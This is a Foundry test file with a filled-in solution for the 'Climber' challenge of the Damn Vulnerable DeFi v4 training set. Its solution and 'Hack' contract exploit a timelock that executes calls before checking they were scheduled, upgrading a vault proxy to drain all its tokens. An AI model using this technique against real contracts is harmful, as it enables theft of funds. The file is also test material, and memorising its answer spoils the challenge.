// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Hack hack = new Hack(
            address(timelock),
            address(vault),
            address(token),
            recovery
        );
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(hack)
        );
        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(hack),
            abi.encodeWithSignature(
                "test(address,address,address)",
                address(token),
                address(vault),
                recovery
            )
        );
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, 0);
        targets[3] = address(hack);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("attack()");

        timelock.execute(targets, values, dataElements, bytes32("114514"));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract Hack is ClimberVault {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address recovery;

    constructor(
        address _timelock,
        address _vault,
        address _token,
        address _recovery
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function attack() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(this),
            abi.encodeWithSignature(
                "test(address,address,address)",
                address(token),
                address(vault),
                recovery
            )
        );
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, 0);
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("attack()");
        timelock.schedule(targets, values, dataElements, bytes32("114514"));
    }

    function test(address token, address vault, address recovery) external {
        IERC20(token).transfer(
            recovery,
            IERC20(token).balanceOf(address(vault))
        );
    }
}
